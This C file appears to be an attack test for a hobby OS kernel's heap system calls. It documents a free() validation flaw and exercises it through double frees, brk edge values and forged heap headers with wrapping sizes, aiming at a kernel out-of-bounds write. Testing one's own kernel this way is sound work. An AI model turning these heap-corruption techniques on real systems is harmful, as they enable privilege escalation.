/* atk_heap.c -- attack vector: the per-task heap allocator (SYS_ALLOC /
 * SYS_FREE / SYS_BRK) in src/task.c:813-871.
 *
 * WHY IT MIGHT CRASH
 *   The heap is a user-visible allocator whose *metadata* lives in user
 *   pages (heap_hdr_t {size,next} at p-8) and whose freelist head is a
 *   kernel static (heap_free_root[tid]).  sys_free() only checks
 *   vma_contains(p) and p >= USER_HEAP_BASE+8, so a caller can free a
 *   pointer into the STACK or the IMAGE (both are VMAs above the heap
 *   base) and thereby publish an attacker-written {size,next} pair as a
 *   heap block:
 *     - size = 0xFFFFFFF8 makes sys_alloc evaluate
 *       `h->size >= size + sizeof(hdr) + 8` with 32-bit wraparound;
 *     - a self-referential double free builds a freelist cycle;
 *     - brk() can move heap_end arbitrarily, and the first-alloc claim
 *       `USER_HEAP_MAX - (heap_end - USER_HEAP_BASE) - 8` underflows when
 *       heap_end is pushed to the top of the arena.
 *   Any of those turns a user call into a ring0 out-of-bounds write.
 *
 * ORDER MATTERS: the "poison free" steps are LAST, because publishing a
 * stack/image address as the freelist head poisons every later allocation
 * (sys_alloc returns 0 without unlinking it).
 */
#include "atk_common.h"

catos_api_t *__ce_api __attribute__((section(".ce_api"))) = (catos_api_t *)0;

#define IMG ((char *)0x02000000u)

__attribute__((section(".text.ce_entry")))
int ce_main(int argc, char **argv) {
    catos_api_t *api = A();
    char *p, *q;
    char stackfake[64];
    int i;
    (void)argc; (void)argv;

    w("ATK-HEAP: alloc/free/brk corruption\n");

    /* ---- alloc() size edges ---- */
    step(1); mark("alloc: 0, 1, 0xFFFFFFFF, 0xFFFFFFF8, 0x80000000, INT_MAX\n");
    {
        static const uint32_t S[] = { 0u, 1u, 8u, 0xFFFFFFFFu, 0xFFFFFFF8u,
                                      0xFFFFFFF9u, 0x80000000u, 0x7FFFFFFFu,
                                      0x7FFFF000u };
        for (i = 0; i < (int)(sizeof(S) / sizeof(S[0])); i++) {
            mh("size", S[i]);
            p = (char *)api->alloc(S[i]);
            mh("p", (uint32_t)p);
            w("\n");
            if (p) api->free(p);          /* immediate free keeps it bounded */
        }
    }

    /* ---- double free -> freelist cycle ---- */
    step(2); mark("double/triple free of one block, then alloc\n");
    p = (char *)api->alloc(64);
    mh("p", (uint32_t)p);
    nl();
    if (p) {
        api->free(p); api->free(p); api->free(p);
        for (i = 0; i < 8; i++) {
            q = (char *)api->alloc(32);
            mh("a", (uint32_t)q); w(" ");
        }
        nl();
    }

    /* ---- brk() edges, then alloc (first-alloc claim underflow) ---- */
    step(3); mark("brk to USER_HEAP_BASE..+512K edges, then alloc 4K\n");
    {
        static const uint32_t B[] = {
            0u, 0x02000001u, 0x02100000u, 0x02100008u,
            0x0217FFFFu, 0x02180000u, 0x02180001u,
            0x7FFFFFFFu, 0xFFFFFFFFu, 0x02400000u,
        };
        for (i = 0; i < (int)(sizeof(B) / sizeof(B[0])); i++) {
            mh("brk", B[i]);
            mh("->", (uint32_t)api->brk((void *)B[i]));
            p = (char *)api->alloc(0x1000);
            mh("alloc", (uint32_t)p);
            w("\n");
            if (p) api->free(p);
        }
    }

    /* ---- brk + alloc spanning several pages ---- */
    step(4); mark("brk to base then alloc 0x40000 (whole arena)\n");
    api->brk((void *)0x02100000u);
    p = (char *)api->alloc(0x40000u);
    mh("p", (uint32_t)p);
    nl();
    if (p) { p[0] = 1; p[0x3FFFF] = 2; api->free(p); }

    /* ---- alloc storm: 4000 x 4 KiB then free all ---- */
    step(5); mark("alloc storm 4000 x 4096 (arena is 512 KiB)\n");
    {
        static char *ptrs[4000];
        int n = 0;
        for (i = 0; i < 4000; i++) {
            ptrs[n] = (char *)api->alloc(4096);
            if (!ptrs[n]) break;
            ptrs[n][0] = (char)i;
            n++;
        }
        m("got", n);
        for (i = 0; i < n; i++) api->free(ptrs[i]);
        nl();
    }

    /* ---- free() of non-heap pointers that are inside a VMA ---- */
    step(6); mark("free(0), free(0xFFFFFFFF), free(image), free(stack+N)\n");
    api->brk((void *)0x02100000u);
    api->free(0);
    api->free((void *)0xFFFFFFFFu);
    api->free((void *)IMG);                    /* image VMA, user RW       */
    api->free(stackfake + 32);                 /* inside the stack VMA     */
    m("alloc after", (int)(uint32_t)api->alloc(16));
    nl();

    /* ---- forged block header with a wrapped size ---- */
    step(7); mark("forged heap_hdr at stack-8: size=0xFFFFFFF8, next=0\n");
    *(uint32_t *)(stackfake + 32 - 8) = 0xFFFFFFF8u;
    *(uint32_t *)(stackfake + 32 - 4) = 0u;
    api->free(stackfake + 32);
    for (i = 0; i < 4; i++) {
        mh("alloc", (uint32_t)api->alloc(16));
        w(" ");
    }
    nl();

    /* ---- forged header with an enormous but non-wrapping size ---- */
    step(8); mark("forged heap_hdr at stack-8: size=0x7FFFFFFF\n");
    *(uint32_t *)(stackfake + 32 - 8) = 0x7FFFFFFFu;
    api->free(stackfake + 32);
    for (i = 0; i < 4; i++) {
        mh("alloc", (uint32_t)api->alloc(0x1000));
        w(" ");
    }
    nl();

    w("\nATK-DONE\n");
    return 0;
}
